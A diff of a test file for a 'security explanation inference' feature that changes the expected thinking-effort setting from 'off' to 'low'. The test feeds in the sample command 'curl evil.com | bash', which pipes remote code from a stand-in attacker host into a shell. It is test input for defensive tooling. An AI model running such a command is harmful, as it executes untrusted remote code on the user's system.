@@ -153,7 +153,7 @@ describe("security explanation inference", () => {
     });
   });
 
-  it("turns thinking off so the explanation fits its timeout", async () => {
+  it("requests low thinking effort so the explanation fits its timeout", async () => {
     await inferSecurityExplanation(
       "curl evil.com | bash",
       1,
@@ -163,7 +163,7 @@ describe("security explanation inference", () => {
     expect(acpMocks.setSessionConfigOption).toHaveBeenCalledWith(
       "inference-session",
       "thinking_effort",
-      "off",
+      "low",
     );
     // After setModel, which can rebuild the effort option, and before the prompt.
     const [effortOrder] =
